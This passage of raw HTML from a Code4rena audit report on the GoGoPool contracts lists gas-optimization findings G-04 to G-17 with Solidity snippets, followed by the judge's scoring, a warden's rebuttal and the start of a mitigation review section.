0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑04] <code>internal</code> functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs <strong>20 to 40 gas</strong> because of two extra <code>JUMP</code> instructions and additional stack operations needed for function calls.</p>\n<p><em>There are 4 instances of this issue.</em></p>\n<h2 id=\"g05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g05 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑05] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2), <code>DUP1</code>(3), <code>ISZERO</code>(3), <code>PUSH2</code>(3), <code>JUMPI</code>(10), <code>PUSH1</code>(3), <code>DUP1</code>(3), <code>REVERT</code>(0), <code>JUMPDEST</code>(1), <code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost.</p>\n<p><em>There are 62 instances of this issue.</em></p>\n<h2 id=\"g06-optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g06-optimize-names-to-save-gas\" aria-label=\"g06 optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑06] Optimize names to save gas</h2>\n<p><code>public</code>/<code>external</code> function names and <code>public</code> member variable names can be optimized to save gas. See <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">this</a> link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save <strong>128 gas</strong> each during deployment, and renaming functions to have lower method IDs will save <strong>22 gas</strong> per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a>.</p>\n<p><em>There are 13 instances of this issue.</em></p>\n<h2 id=\"g07-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g07-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g07 use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑07] Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas.</p>\n<p><em>There are 4 instances of this issue.</em></p>\n<h2 id=\"g08-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" style=\"position:relative;\"><a href=\"#g08-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" aria-label=\"g08 add unchecked  for subtractions where the operands cannot underflow because of a previous require or if statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑08] Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</h2>\n<p><code>require(a &#x3C;= b); x = b - a</code> => <code>require(a &#x3C;= b); unchecked { x = b - a }</code>.</p>\n<p><em>There are 7 instances of this issue.</em></p>\n<h2 id=\"g09-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" style=\"position:relative;\"><a href=\"#g09-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" aria-label=\"g09 multiple accesses of a mappingarray should use a local variable cache permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑09] Multiple accesses of a mapping/array should use a local variable cache</h2>\n<p>The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping’s value in a local <code>storage</code> or <code>calldata</code> variable when the value is accessed <a href=\"https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0\">multiple times</a>, saves <strong>~42 gas per access</strong> due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - <strong>30 gas</strong>) and that calculation’s associated stack operations. Caching an array’s struct avoids recalculating the array offsets into memory/calldata.</p>\n<p><em>There are 4 instances of this issue.</em></p>\n<h2 id=\"g10-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g10-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g10 state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10] State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (<strong>100 gas</strong>) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.</p>\n<p><em>There are 11 instances of this issue.</em></p>\n<h2 id=\"g11-modification-of-getx-setx-deletex-addx-and-subx-in-baseabstractsol-increases-gas-savings-in-g10\" style=\"position:relative;\"><a href=\"#g11-modification-of-getx-setx-deletex-addx-and-subx-in-baseabstractsol-increases-gas-savings-in-g10\" aria-label=\"g11 modification of getx setx deletex addx and subx in baseabstractsol increases gas savings in g10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑11] Modification of <code>getX()</code>, <code>setX()</code>, <code>deleteX()</code>, <code>addX()</code> and <code>subX()</code> in <code>BaseAbstract.sol</code> increases gas savings in [G‑10]</h2>\n<p>Modify the <code>getX()</code>, <code>setX()</code>, <code>deleteX()</code>, <code>addX()</code> and <code>subX()</code> functions in <code>BaseAbstract.sol</code> to receive the address of the <code>Storage</code> contract as an argument. This modification will create dozens more fixable instances of [G‑10].</p>\n<p><em>There are 116 instances of this issue.</em></p>\n<h2 id=\"g12-x--y-costs-more-gas-than-x--x--y-for-state-variables---too\" style=\"position:relative;\"><a href=\"#g12-x--y-costs-more-gas-than-x--x--y-for-state-variables---too\" aria-label=\"g12 x  y costs more gas than x  x  y for state variables   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑12] <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables (<code>-=</code> too)</h2>\n<p>Using the addition operator instead of plus-equals saves <strong><a href=\"https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8\">113 gas</a></strong>. Subtructions act the same way.</p>\n<p><em>There are 12 instances of this issue.</em></p>\n<h2 id=\"g13-division-by-two-should-use-bit-shifting\" style=\"position:relative;\"><a href=\"#g13-division-by-two-should-use-bit-shifting\" aria-label=\"g13 division by two should use bit shifting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑13] Division by two should use bit shifting</h2>\n<p><code>&#x3C;x> / 2</code> is the same as <code>&#x3C;x> >> 1</code>. While the compiler uses the <code>SHR</code> opcode to accomplish both, the version that uses division incurs an overhead of <a href=\"https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff\"><strong>20 gas</strong></a> due to <code>JUMP</code>s to and from a compiler utility function that introduces checks which can be avoided by using <code>unchecked {}</code> around the division by two.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">413</span><span class=\"mtk1\"> \t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxHalfRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g14-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g14-the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g14 the result of function calls should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑14] The result of function calls should be cached rather than re-calling the function</h2>\n<p>The instances below point to the second+ call of the function within a single function. <em>Every</em> external call made to a contract incurs at least <strong>100 gas</strong> of overhead.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"g15-dont-compare-boolean-expressions-to-boolean-literals\" style=\"position:relative;\"><a href=\"#g15-dont-compare-boolean-expressions-to-boolean-literals\" aria-label=\"g15 dont compare boolean expressions to boolean literals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑15] Don’t compare boolean expressions to boolean literals</h2>\n<p><code>if (&#x3C;x> == true)</code> => <code>if (&#x3C;x>)</code>, <code>if (&#x3C;x> == false)</code> => <code>if (!&#x3C;x>)</code>.</p>\n<p><em>There are 3 instances of this issue.</em></p>\n<h2 id=\"g16-splitting-require-statements-that-use--saves-gas\" style=\"position:relative;\"><a href=\"#g16-splitting-require-statements-that-use--saves-gas\" aria-label=\"g16 splitting require statements that use  saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑16] Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</h2>\n<p>See <a href=\"https://github.com/code-423n4/2022-01-xdefi-findings/issues/128\">this issue</a> which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by <strong>3 gas</strong>.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">upgradeable</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC20Upgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\"> \t\t\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;INVALID_SIGNER&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"g17-stack-variable-used-as-a-cheaper-cache-for-a-state-variable-is-only-used-once\" style=\"position:relative;\"><a href=\"#g17-stack-variable-used-as-a-cheaper-cache-for-a-state-variable-is-only-used-once\" aria-label=\"g17 stack variable used as a cheaper cache for a state variable is only used once permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑17] Stack variable used as a cheaper cache for a state variable is only used once</h2>\n<p>If the variable is only accessed once, it’s cheaper to use the state variable directly that one time, and save the <strong>3 gas</strong> the extra stack assignment would spend.</p>\n<p><em>There are 3 instances of this issue.</em></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1400481524\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[G‑01] State variables can be packed into fewer storage slots</strong><br>\nNot awarding as it will only save gas at deploy time</p>\n<p><strong>[G‑02] Use a more recent version of solidity</strong><br>\nSkipping as missing further info</p>\n<p><strong>[G‑03] <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in for- and while-loops</strong><br>\n25 * 7</p>\n<p><strong>[G‑04] internal functions only called once can be inlined to save gas</strong><br>\n16 per instance<br>\n4 * 16</p>\n<p><strong>[G‑05] Functions guaranteed to revert when called by normal users can be marked payable</strong><br>\nIgnoring</p>\n<p><strong>[G‑06] Optimize names to save gas</strong><br>\nIgnoring</p>\n<p><strong>[G‑07] Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</strong><br>\nIgnoring for lack of proven benchmarks</p>\n<p><strong>[G‑08] Add unchecked {} for subtractions where the operands cannot underflow because of a previous <code>require()</code> or if-statement</strong><br>\n7 * 20</p>\n<p><strong>[G‑09] Multiple accesses of a mapping/array should use a local variable cache</strong><br>\n2 are “normal” to avoid the -= or += the other 2 are valid<br>\n2 * 100</p>\n<p><strong>[G‑10] State variables should be cached in stack variables rather than re-reading them from storage</strong><br>\n11 * 100</p>\n<p><strong>[G‑11] Modification of <code>getX()</code>, <code>setX()</code>, <code>deleteX()</code>, <code>addX()</code> and <code>subX()</code> in BaseAbstract.sol increases gas savings in [G‑10]</strong><br>\nAm understanding this as the idea of inlining the call rather than using a function.<br>\n16 * 116</p>\n<p>1856</p>\n<p><strong>[G‑12] <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables (-= too)</strong><br>\nOut of scope</p>\n<p><strong>[G‑13] Division by two should use bit shifting</strong><br>\nEquivalent to using unchecked</p>\n<p>20</p>\n<p><strong>[G‑14] The result of function calls should be cached rather than re-calling the function</strong><br>\n340 * 2</p>\n<p>680</p>\n<p><strong>[G‑15] Don’t compare boolean expressions to boolean literals</strong><br>\n27</p>\n<p><strong>[G‑16] Splitting require() statements that use &#x26;&#x26; saves gas</strong><br>\nMarginal</p>\n<p><strong>[G‑17] Stack variable used as a cheaper cache for a state variable is only used once</strong><br>\nMarginal</p>\n<p>Total: 4262</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1416791198\">NoamYakov (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p> <strong>[G‑11] Modification of <code>getX()</code>, <code>setX()</code>, <code>deleteX()</code>, <code>addX()</code> and <code>subX()</code> in BaseAbstract.sol increases gas savings in [G‑10]</strong><br>\nAm understanding this as the idea of inlining the call rather than using a function\n16 * 116</p>\n</blockquote>\n<p>This wasn’t what I meant. I meant that each of these functions accesses the <code>gogoStorage</code> state variable (SLOAD). Therefore, when there’s more than one call to this group of functions (for example, <code>setUint()</code> followed by another <code>setUint()</code>, or <code>setUint()</code> followed by <code>getAddress()</code>), it would me much cheaper to cache that state variable (<code>gogoStorage</code>) and pass it to the these functions. This way, there will be only one SLOAD.</p>\n<p>In my gas report, I flagged the second+ calls to this group of functions as instances, since this optimization can spare an SLOAD in each of these calls. There are 116 instances, each saves 100 gas (like in G-10) - meaning a total saving of 11600 gas.</p>\n<blockquote>\n<p><strong>[G‑12] <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables (-= too)</strong><br>\nOut of scope</p>\n</blockquote>\n<p>Why is that out-of-scope? The <code>TokenggAVAX.sol</code> and <code>ERC20Upgradeable.sol</code> contracts are in scope, and this optimization wasn’t included in the C4audit output.</p>\n<p>Overall, My gas report saves an additional amount of 12956 gas. So the total gas savings are <strong>17218 gas</strong>. Therefore, I believe my gas report should be the one selected for the report. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1416805415\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@NoamYakov - Thank you for the comment, to clarify regarding G-11, are you saying to cache the address of Storage or to make it Immutable as to avoid the extra SLOAD?</p>\n<p>The += is a knee jerk reaction I have in judging and have judged it as OOS for all reports.<br>\nMy own benchmarks show that’s it’s a very marginal saving, especially because it will not save gas when used in combination with <code>unchecked</code>, either way it would raise / lower the majority of reports so it will not matter as much.</p>\n<p>Lmk about G-11 please.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1416807927\">NoamYakov (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I’m saying to cache the address of Storage in order to avoid the extra SLOAD.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/125#issuecomment-1422190992\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I agree with the suggested refactoring, I believe there’s fair ground to cap the value of the refactoring to a certain value (e.g 5k gas saved). That said, after factoring that in, the refactoring would save the most gas.</p>\n<p>Technically a better solution would be to just use <code>immutable</code> which would avoid all SLOADs.</p>\n</blockquote>\n<hr>\n<h1 id=\"mitigation-review\" style=\"position:relative;\"><a href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review</h1>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>Following the C4 audit contest, 3 wardens (<a href=\"https://twitter.com/hansfriese\">hansfriese</a>, RaymondFam, and <a href=\"https://twitter.com/Xc1008Cu\">ladboy233</a>) reviewed the mitigations for all identified issues. Additional details can be found within the <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest\">C4 GoGoPool Versus Mitigation Review contest repository</a>.</p>\n<h2 id=\"overview-of-changes\" style=\"position:relative;\"><a href=\"#overview-of-changes\" aria-label=\"overview of changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" 